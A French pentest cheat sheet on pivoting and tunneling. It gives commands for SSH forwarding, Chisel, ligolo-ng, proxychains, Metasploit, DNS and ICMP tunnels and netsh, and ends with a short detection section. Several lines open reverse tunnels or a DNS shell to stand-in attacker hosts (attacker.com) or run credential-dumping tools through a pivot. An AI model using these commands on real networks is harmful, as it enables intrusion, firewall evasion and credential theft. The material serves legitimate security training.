---
title: Pivoting et Tunneling
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [pivoting, tunneling, chisel, ligolo, ssh, proxychains, pentest, sécurité]
date: 2026-03-23
---

# Pivoting et Tunneling

Le pivoting consiste à utiliser une machine compromise comme relais pour accéder à des réseaux internes autrement inaccessibles depuis la machine de l'attaquant. Le tunneling encapsule du trafic dans des protocoles autorisés (HTTP, DNS, SSH) pour contourner les pare-feux.

## Concepts fondamentaux

```
Topologie typique :

  Attaquant (Internet)
       ↕  (accès direct)
  Machine pivot (DMZ / réseau accessible)
       ↕  (accès indirect via pivot)
  Réseau interne (192.168.10.0/24)
       ↕
  Cible finale (192.168.10.50)

Types de tunnels :
  Port Forwarding  → rediriger un port spécifique
  SOCKS Proxy      → proxy générique (TCP, UDP) → outil de choix pour la navigation
  VPN-like         → interface réseau virtuelle (ligolo-ng, WireGuard)

Sens des connexions :
  Forward (Local)  → attaquant ouvre un port, pivot y connecte (nécessite accès entrant vers pivot)
  Reverse          → pivot initie la connexion vers l'attaquant (passe les firewalls sortants)
```

## SSH Tunneling

SSH est le vecteur de pivoting le plus simple quand un accès SSH est disponible.

```bash
# Local Port Forwarding — accéder à un service du réseau interne
# Accéder à RDP (192.168.10.50:3389) via le pivot SSH
ssh -L 13389:192.168.10.50:3389 user@pivot.exemple.com
# → connexion locale : rdesktop localhost:13389

# Multiple forwards en une commande
ssh -L 13389:192.168.10.50:3389 \
    -L 18080:192.168.10.60:80 \
    -L 11433:192.168.10.70:1433 \
    user@pivot.exemple.com

# Remote Port Forwarding — exposer un port local vers le pivot
# Rendre le port 80 de l'attaquant accessible depuis le pivot
ssh -R 8080:localhost:80 user@pivot.exemple.com
# → Sur le pivot : curl localhost:8080 → atteint la machine de l'attaquant

# SOCKS Proxy via SSH (dynamic port forwarding)
ssh -D 1080 -N user@pivot.exemple.com
# -D 1080 → proxy SOCKS5 sur le port 1080 de l'attaquant
# -N      → pas de shell interactif (juste le tunnel)

# Utilisation avec proxychains
# /etc/proxychains4.conf : socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.10.0/24 -p 22,80,443,3389
proxychains curl http://192.168.10.50/
proxychains python3 secretsdump.py domaine.local/admin:pass@192.168.10.1

# SSH multi-hop (double pivot)
ssh -J user1@pivot1.com user2@192.168.10.50
# Ou : ProxyJump dans ~/.ssh/config
```

## Chisel — Tunneling HTTP/HTTPS

Chisel crée des tunnels TCP/UDP encapsulés dans HTTP. Idéal quand seul le port 80/443 est ouvert.

```bash
# Installation
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64

# Serveur Chisel (sur la machine de l'attaquant)
./chisel server --port 8080 --reverse

# Client Chisel (sur le pivot)
./chisel client 192.168.1.100:8080 R:socks
# → Crée un proxy SOCKS5 inverse sur le port 1080 de l'attaquant

# SOCKS5 sur port spécifique
./chisel client 192.168.1.100:8080 R:1080:socks

# Port forwarding spécifique (RDP interne)
./chisel client 192.168.1.100:8080 R:13389:192.168.10.50:3389

# Multiple tunnels en une commande
./chisel client 192.168.1.100:8080 \
    R:1080:socks \
    R:13389:192.168.10.50:3389 \
    R:18080:192.168.10.60:80

# Via HTTPS (chiffrement)
./chisel server --port 443 --reverse --tls-cert cert.pem --tls-key key.pem
./chisel client https://attacker.com:443 R:socks
```

## Ligolo-ng — Interface réseau virtuelle

Ligolo-ng crée une interface réseau virtuelle sur l'attaquant → accès transparent au réseau interne (pas besoin de proxychains).

```bash
# Installation (proxy = serveur attaquant, agent = sur le pivot)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64.tar.gz

# Serveur (attaquant)
sudo ip tuntap add user $USER mode tun ligolo    # Créer l'interface TUN
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Agent (pivot)
./agent -connect 192.168.1.100:11601 -ignore-cert

# Dans la console Ligolo (sur l'attaquant)
ligolo-ng » session          # Lister les sessions
ligolo-ng » 1                # Sélectionner la session
ligolo-ng » ifconfig         # Voir les interfaces du pivot
ligolo-ng » start            # Démarrer le tunnel

# Ajouter les routes vers le réseau interne
sudo ip route add 192.168.10.0/24 dev ligolo
# → Maintenant accessible directement, sans proxychains
nmap -sV 192.168.10.50        # Scan direct

# Double pivot — tunneler depuis le pivot vers un 3ème réseau
# Sur le pivot (niveau 1), déployer un agent secondaire
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
# → Écoute sur le pivot, redirige vers le serveur ligolo de l'attaquant
# Agent niveau 2 se connecte au pivot (niveau 1) sur 11601
```

## Proxychains — Utilisation

```bash
# Configuration de proxychains
# /etc/proxychains4.conf

# Mode strict (tous les proxies doivent répondre)
strict_chain

# Mode dynamique (ignore les proxies morts)
dynamic_chain

# Proxy chain
socks5 127.0.0.1 1080    # Proxy SOCKS5 principal (Chisel ou SSH)
# socks4 127.0.0.1 9050   # Tor si nécessaire

# Double pivot — chainer deux proxies
socks5 127.0.0.1 1080    # Pivot 1
socks5 127.0.0.1 1081    # Pivot 2 (via le premier)

# Utilisation
proxychains nmap -sT -Pn -p 22,80,445,3389 192.168.10.0/24
proxychains curl http://192.168.10.50/
proxychains evil-winrm -i 192.168.10.50 -u admin -p password
proxychains msfconsole     # Metasploit via le proxy
proxychains python3 GetNPUsers.py domaine.local/ -dc-ip 192.168.10.1 -no-pass -usersfile users.txt

# Note : proxychains ne fonctionne pas avec nmap UDP (-sU) ni avec ICMP
# Pour UDP → udp2tcp ou tunnels spécialisés
```

## Metasploit — Pivoting intégré

```bash
# Depuis une session Meterpreter
meterpreter > run autoroute -s 192.168.10.0/24   # Ajouter une route
meterpreter > background

# Configurer le proxy SOCKS dans Metasploit
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j

# Porter forwarding via Meterpreter
meterpreter > portfwd add -l 13389 -p 3389 -r 192.168.10.50
# → localhost:13389 → 192.168.10.50:3389

# Scan du réseau interne via le pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.10.0/24
msf6 > set PORTS 22,80,443,445,3389
msf6 > run
```

## DNS Tunneling

Encapsuler du trafic dans des requêtes DNS pour traverser les firewalls les plus restrictifs.

```bash
# DNScat2 — C2 via DNS
# Serveur (avec contrôle d'un domaine, ex: tunnel.attacker.com)
ruby dnscat2.rb --dns "domain=tunnel.attacker.com,host=0.0.0.0" --no-cache

# Client (sur le pivot — pas d'accès HTTP mais DNS autorisé)
./dnscat tunnel.attacker.com

# Dans dnscat2 — shell et tunneling
dnscat2> window -i 1
command (pivot) 1> shell
# → Shell interactif via DNS

# Port forwarding via dnscat2
command> listen 0.0.0.0:13389 192.168.10.50:3389

# iodine — tunneling IP over DNS (plus rapide que dnscat pour le SOCKS)
# Serveur
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client (pivot)
iodine -f -P password tunnel.attacker.com
# → Interface dns0 créée → IP 10.0.0.2 → trafic IP via DNS
```

## Tunneling ICMP

```bash
# ptunnel-ng — tunneling TCP via ICMP echo request/reply
# Serveur (attaquant, ou pivot avec accès ICMP sortant)
ptunnel-ng

# Client
ptunnel-ng -p PIVOT_IP -lp 8080 -da TARGET_IP -dp 80
# → localhost:8080 → TARGET:80 via ICMP

# Hans — tunneling IP via ICMP (similaire à iodine mais ICMP)
# Sur le serveur
hans -s 10.1.2.0 -p password

# Sur le client
hans -c PIVOT_IP -p password
```

## Techniques Windows natives

```powershell
# netsh — port forwarding Windows (sans outils tiers)
# Forwarder le port local 13389 vers 192.168.10.50:3389
netsh interface portproxy add v4tov4 \
    listenaddress=0.0.0.0 listenport=13389 \
    connectaddress=192.168.10.50 connectport=3389

# Lister les règles de port forwarding
netsh interface portproxy show all

# Supprimer une règle
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=13389

# PowerShell — port forwarding avec System.Net.Sockets
# Script de port forward basique (sans dépendances)
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 13389))
$listener.Start()
```

## Contre-mesures et détection

```
Détection du pivoting :
  → Connexions sortantes inhabituelles depuis des serveurs (SSH vers internet)
  → Trafic DNS anormalement volumineux ou à haute entropie (DNS tunneling)
  → Processus écoutant sur des ports inhabituels (netstat -tulnp)
  → Fichiers binaires inhabituels (chisel, ligolo, dnscat) sur le système

Défenses réseau :
  ✓ Segmentation stricte avec firewalls entre zones (pas de routing direct inter-segments)
  ✓ Filtrage des connexions sortantes des serveurs (whitelist des destinations)
  ✓ Inspection TLS (HTTPS) sur les proxies sortants
  ✓ Filtrage DNS : bloquer les requêtes DNS vers des serveurs non autorisés
  ✓ IDS/IPS : signatures pour Chisel, ligolo, dnscat
  ✓ Surveiller les connexions ICMP volumineuses (anomalie)
  ✓ Désactiver SSH depuis les serveurs DMZ vers internet
```
